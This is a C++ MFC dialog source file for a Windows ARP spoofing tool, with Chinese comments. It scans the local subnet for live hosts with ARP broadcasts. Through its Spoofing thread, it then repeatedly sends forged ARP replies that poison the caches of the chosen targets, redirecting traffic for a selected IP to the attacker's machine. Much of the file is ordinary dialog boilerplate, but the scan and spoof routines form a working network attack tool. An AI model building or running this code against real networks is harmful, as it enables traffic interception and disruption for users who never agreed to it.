// ArpSpoofingForWindowsDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "ArpSpoofingForWindows.h"
#include "ArpSpoofingForWindowsDlg.h"
#include "afxdialogex.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define LOG 1

int _log(char *fmt, ...)
{
#ifdef LOG
	va_list args;
	struct tm *tm;
	time_t cur_time;
	char timebuf[256];
	char buf[1024];
	FILE *fd_log;

	va_start(args, fmt);
	vsnprintf_s(buf, 1024, fmt, args);
	va_end(args);

	time(&cur_time);
	tm = localtime(&cur_time);
	sprintf_s(timebuf, "%04d/%02d/%02d %02d:%02d:%02d ",
		tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday, tm->tm_hour, tm->tm_min, tm->tm_sec);

	fd_log = fopen(LOGFILE_ERR, "a+");
	if (fd_log)
	{
		fwrite(timebuf, strlen(timebuf), 1, fd_log);
		fwrite(buf, strlen(buf), 1, fd_log);
		fclose(fd_log);
		return 1;
	}
#endif
	return 0;
}

bool running = true;

struct threadParam
{
	CComboBox *mAdapter;
	CStatic *mAdapterInfo;
	Adapter *adapter;
	CListCtrl *mHostList;
	CListCtrl *mAttackList;
	ARP *mArp;
	CWnd *mButton;
	char *attackIp;
};
struct threadParam pParam;

UINT SnifferAliveHost(LPVOID pParam)
{
	struct threadParam *lp = (struct threadParam *)pParam;
	CComboBox *mAdapter = lp->mAdapter;
	CStatic *mAdapterInfo = lp->mAdapterInfo;
	Adapter *adapter = lp->adapter;
	CListCtrl *mHostList = lp->mHostList;
	ARP *mArp = lp->mArp;
	CWnd *mButton = lp->mButton;

	mHostList->DeleteAllItems();
	int choose = mAdapter->GetCurSel();
	string str = adapter->getAdapterIp(choose)[0];
	char *p = const_cast<char *>(str.c_str());
	uint8_t ip[IP_ADDR_LEN];
	_log("localIp:%s\n", p);
	ARP::string2Ip(p, ip);
	adapter->setFocusdev(choose);
	char macBuf[MAC_BUF_LEN];
	if (adapter->openAdapter() != 0 || adapter->getSelfMac(choose, macBuf) != 0)
	{
		//MessageBox(_T("Get Mac Address Error!"));
		mButton->EnableWindow(true);
		mButton->SetWindowTextW(_T("Scan"));
		return -1;
	}
	adapter->startSniffer4AliveHost();
	char ipBuf[IP_BUF_LEN];
	for (int i = 1; i < 255; i++)
	{	
		ip[3] = i;
		CString tt;
		tt.Format(_T("%d"), i);
		ARP::ip2String(ip, ipBuf);
		mArp->setBroadcast(macBuf, p, ipBuf);
		u_char buf[128];
		memcpy(buf, mArp->getPacket(), sizeof(struct arp));
		adapter->sendPacket(buf, sizeof(struct arp));
		Sleep(10);
	}
	Sleep(1000);
	adapter->stopSniffer4AliveHost();
	int seq = 0;
	mHostList->DeleteAllItems();
	for (int i = 1; i < 255; ++i)
	{
		if (Adapter::aliveHostIndex[i] == 1)
		{
			_log("check alive %d\n", i);
			ip[3] = i;
			ARP::ip2String(ip, ipBuf);
			CString cstr(ipBuf);
			mHostList->InsertItem(seq++, cstr);
		}
	}
	mButton->EnableWindow(true);
	mButton->SetWindowTextW(_T("Scan"));
	return 0;
}

UINT Spoofing(LPVOID pParam)
{
	struct threadParam *lp = (struct threadParam *)pParam;
	CComboBox *mAdapter = lp->mAdapter;
	CStatic *mAdapterInfo = lp->mAdapterInfo;
	Adapter *adapter = lp->adapter;
	CListCtrl *mHostList = lp->mHostList;
	ARP *mArp = lp->mArp;
	CWnd *mButton = lp->mButton;
	CListCtrl *mAttackList = lp->mAttackList;
	char *attackIp = lp->attackIp;
	while (running)
	{
		// 遍历target host list
		for (int i = 0; i < mAttackList->GetItemCount(); i++)
		{
			CString ipCstr(mAttackList->GetItemText(i, 0));
			USES_CONVERSION;
			string ipStr(W2A(ipCstr));
			string macStr(Adapter::ipMac[ipStr]);
			char *dstIp = const_cast<char *>(ipStr.c_str());
			char *dstMac = const_cast<char *>(macStr.c_str());
			mArp->setSpoofing(Adapter::localMac, attackIp, dstMac, dstIp);
			u_char buf[128];
			memcpy(buf, mArp->getPacket(), sizeof(struct arp));
			adapter->sendPacket(buf, sizeof(struct arp));
		}
		Sleep(800);
	}
	return 0;
}


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CArpSpoofingForWindowsDlg 对话框



CArpSpoofingForWindowsDlg::CArpSpoofingForWindowsDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CArpSpoofingForWindowsDlg::IDD, pParent)
	, adapter(NULL), mArp(NULL)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	adapter = new Adapter();
	mArp = new ARP();
}

CArpSpoofingForWindowsDlg::~CArpSpoofingForWindowsDlg()
{
	delete adapter;
	delete mArp;
}

void CArpSpoofingForWindowsDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ADAPTER, mAdapter);
	DDX_Control(pDX, IDC_ADAPTERINFO, mAdapterInfo);
	DDX_Control(pDX, IDC_LIST3, mHostList);
	DDX_Control(pDX, IDC_LIST4, mAttackList);
	DDX_Control(pDX, IDC_ATTACKINFO, mAttackInfo);
}

BEGIN_MESSAGE_MAP(CArpSpoofingForWindowsDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_CBN_SELCHANGE(IDC_ADAPTER, &CArpSpoofingForWindowsDlg::OnCbnSelchangeAdapter)
	ON_BN_CLICKED(IDC_BUTTON1, &CArpSpoofingForWindowsDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CArpSpoofingForWindowsDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &CArpSpoofingForWindowsDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &CArpSpoofingForWindowsDlg::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_START, &CArpSpoofingForWindowsDlg::OnBnClickedStart)
	ON_BN_CLICKED(IDC_STOP, &CArpSpoofingForWindowsDlg::OnBnClickedStop)
END_MESSAGE_MAP()


// CArpSpoofingForWindowsDlg 消息处理程序

BOOL CArpSpoofingForWindowsDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO:  在此添加额外的初始化代码
	CString cstr;
	for (int i = 0; i < adapter->getAdapterNum(); ++i)
	{
		cstr = adapter->getAdapterDescription(i).c_str();
		_log("Description:[%d]%s\n", i, adapter->getAdapterDescription(i).c_str());
		mAdapter.AddString(cstr);
	}
	mAdapter.SetCurSel(0);
	adapter->setFocusdev(0);
	//Get Mac function success but delay
	/*char macBuf[MAC_BUF_LEN];
	cstr = _T("[MAC]\r\n  ");
	if (adapter->openAdapter() == 0 && adapter->getSelfMac(0, macBuf) == 0)
	{
		cstr += macBuf;
	}*/
	cstr = "[IP]\r\n  ";
	cstr += adapter->getAdapterIp(0)[0].c_str();
	memcpy(Adapter::localIp, adapter->getAdapterIp(0)[0].c_str(), IP_BUF_LEN);
	cstr += "\r\n[Netmask]\r\n  ";
	cstr += adapter->getAdapterNetmask(0)[0].c_str();
	cstr += "\r\n[Broadcast]\r\n  ";
	cstr += adapter->getAdapterBroadaddr(0)[0].c_str();
	mAdapterInfo.SetWindowTextW(cstr);
	
	LONG lStyle;
	lStyle = GetWindowLong(mHostList.m_hWnd, GWL_STYLE);
	lStyle &= ~LVS_TYPEMASK; //清除
	lStyle |= LVS_REPORT; //设置REPORT样式
	lStyle |= LVS_NOCOLUMNHEADER;
	SetWindowLong(mAttackList.m_hWnd, GWL_STYLE, lStyle);
	SetWindowLong(mHostList.m_hWnd, GWL_STYLE, lStyle);
	DWORD dwStyle = mHostList.GetExtendedStyle();
	dwStyle |= LVS_EX_GRIDLINES; //网格线
	dwStyle |= LVS_EX_FULLROWSELECT; //选中某行使整行高亮
//	dwStyle |= LVS_EX_CHECKBOXES; //每行生成checkbox控件
	dwStyle |= LVS_EX_FLATSB; //扁平风格滚动
	mHostList.SetExtendedStyle(dwStyle);
	mAttackList.SetExtendedStyle(dwStyle);
	mHostList.InsertColumn(0, _T("IP"), 0, 129, -1);
	mAttackList.InsertColumn(0, _T("IP"), 0, 129, -1);

	this->GetDlgItem(IDC_SETATTACKHOST)->EnableWindow(false);
	this->GetDlgItem(IDC_START)->EnableWindow(false);
	this->GetDlgItem(IDC_STOP)->EnableWindow(false);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CArpSpoofingForWindowsDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CArpSpoofingForWindowsDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CArpSpoofingForWindowsDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CArpSpoofingForWindowsDlg::OnCbnSelchangeAdapter()
{
	// TODO:  在此添加控件通知处理程序代码
	CString cstr;
	int choose = mAdapter.GetCurSel();
	adapter->setFocusdev(choose);
	//Get Mac function success but delay
	/*char macBuf[MAC_BUF_LEN];
	cstr = _T("[MAC]\r\n  ");
	if (adapter->openAdapter() == 0 && adapter->getSelfMac(choose, macBuf) == 0)
	{
		cstr += macBuf;
	}*/
	cstr = "[IP]\r\n  ";
	cstr += adapter->getAdapterIp(choose)[0].c_str();
	memcpy(Adapter::localIp, adapter->getAdapterIp(choose)[0].c_str(), IP_BUF_LEN);
	cstr += "\r\n[Netmask]\r\n  ";
	cstr += adapter->getAdapterNetmask(choose)[0].c_str();
	cstr += "\r\n[Broadcast]\r\n  ";
	cstr += adapter->getAdapterBroadaddr(choose)[0].c_str();
	mAdapterInfo.SetWindowTextW(cstr);
	this->GetDlgItem(IDC_BUTTON1)->EnableWindow(true);
	this->GetDlgItem(IDC_BUTTON1)->SetWindowTextW(_T("Scan"));
}


void CArpSpoofingForWindowsDlg::OnBnClickedButton1()
{
	// TODO:  在此添加控件通知处理程序代码
	this->GetDlgItem(IDC_BUTTON1)->EnableWindow(false);
	this->GetDlgItem(IDC_BUTTON1)->SetWindowTextW(_T("Scanning"));
	pParam.adapter = adapter;
	pParam.mAdapter = &mAdapter;
	pParam.mAdapterInfo = &mAdapterInfo;
	pParam.mArp = mArp;
	pParam.mHostList = &mHostList;
	pParam.mButton = GetDlgItem(IDC_BUTTON1);
	CWinThread* snifferThread = AfxBeginThread(SnifferAliveHost, &pParam);
	this->GetDlgItem(IDC_SETATTACKHOST)->EnableWindow(true);
}

void CArpSpoofingForWindowsDlg::OnBnClickedButton2()
{
	// add attack list
	int num = mAttackList.GetItemCount();
	int count = mHostList.GetItemCount();
	for (int i = 0; i < count; i++)
	{
		// || mHostList.GetCheck(i)
		if (mHostList.GetItemState(i, LVIS_SELECTED) == LVIS_SELECTED)
		{
			_log("+selected %d %d %d\n", i, count, num);
			mAttackList.InsertItem(num++, mHostList.GetItemText(i, 0));
			mHostList.DeleteItem(i);
		}
	}
	
	mHostList.Arrange(LVA_DEFAULT);
	mHostList.RedrawItems(0, mHostList.GetItemCount());
	mAttackList.Arrange(LVA_DEFAULT);
	mAttackList.RedrawItems(0, mAttackList.GetItemCount());
}


void CArpSpoofingForWindowsDlg::OnBnClickedButton3()
{
	// remove attack list
	int count = mHostList.GetItemCount();
	int num = mAttackList.GetItemCount();
	for (int i = 0; i < num; i++)
	{
		// mAttackList.GetCheck(i)
		if (mAttackList.GetItemState(i, LVIS_SELECTED) == LVIS_SELECTED)
		{
			_log("-selected %d\n", i);
			mHostList.InsertItem(count++, mAttackList.GetItemText(i, 0));
			mAttackList.DeleteItem(i);
		}
	}
	mHostList.Arrange(LVA_DEFAULT);
	mHostList.RedrawItems(0, mHostList.GetItemCount());
	mAttackList.Arrange(LVA_DEFAULT);
	mAttackList.RedrawItems(0, mAttackList.GetItemCount());

	
}


void CArpSpoofingForWindowsDlg::OnBnClickedButton4()
{
	// set attack host
	POSITION pos = mHostList.GetFirstSelectedItemPosition();
	if (pos)
	{
		CString cstr;
		cstr = _T("Attack Host: ");
		int nItem = mHostList.GetNextSelectedItem(pos);
		CString ip(mHostList.GetItemText(nItem, 0));
		USES_CONVERSION;
		string ipstr(W2A(ip));
		char *p = const_cast<char *>(ipstr.c_str());
		memcpy(attackIp, p, IP_BUF_LEN);
		cstr += attackIp;
		mAttackInfo.SetWindowTextW(cstr);
		this->GetDlgItem(IDC_START)->EnableWindow(true);
	}
	else
	{
		MessageBox(_T("Please select attack host!"));
	}
}

void CArpSpoofingForWindowsDlg::OnBnClickedStart()
{
	// TODO:  在此添加控件通知处理程序代码
	this->GetDlgItem(IDC_BUTTON1)->EnableWindow(false);
	this->GetDlgItem(IDC_SETATTACKHOST)->EnableWindow(false);
	this->GetDlgItem(IDC_START)->EnableWindow(false);
	this->GetDlgItem(IDC_STOP)->EnableWindow(true);

	pParam.adapter = adapter;
	pParam.mAdapter = &mAdapter;
	pParam.mAdapterInfo = &mAdapterInfo;
	pParam.mArp = mArp;
	pParam.mHostList = &mHostList;
	pParam.mButton = GetDlgItem(IDC_BUTTON1);
	pParam.mAttackList = &mAttackList;
	pParam.attackIp = attackIp;
	running = true;
	CWinThread* snifferThread = AfxBeginThread(Spoofing, &pParam);
}




void CArpSpoofingForWindowsDlg::OnBnClickedStop()
{
	// TODO:  在此添加控件通知处理程序代码
	running = false;
	this->GetDlgItem(IDC_BUTTON1)->EnableWindow(true);
	this->GetDlgItem(IDC_SETATTACKHOST)->EnableWindow(true);
	this->GetDlgItem(IDC_START)->EnableWindow(true);
	this->GetDlgItem(IDC_STOP)->EnableWindow(false);
}
